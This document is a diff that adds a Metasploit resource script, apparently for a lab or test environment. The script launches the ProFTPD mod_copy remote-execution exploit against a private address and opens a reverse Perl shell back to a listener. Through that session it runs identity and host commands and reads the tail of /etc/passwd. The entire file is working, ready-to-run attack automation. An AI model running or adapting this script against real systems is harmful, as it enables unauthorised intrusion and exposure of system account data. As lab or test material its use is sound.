@@ -1,0 +1,17 @@
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS 172.30.0.12
+set RPORT 80
+set RPORT_FTP 21
+set SITEPATH /var/www/html
+set TARGETURI /
+set payload cmd/unix/reverse_perl
+set LHOST 172.30.0.2
+set LPORT 4444
+set ExitOnSession false
+check
+exploit -j -z
+sleep 9
+sessions -l
+sessions -c "echo ===PROOF===; id; whoami; hostname; uname -a; cat /etc/passwd | tail -4" -i 1
+sleep 4
+exit -y
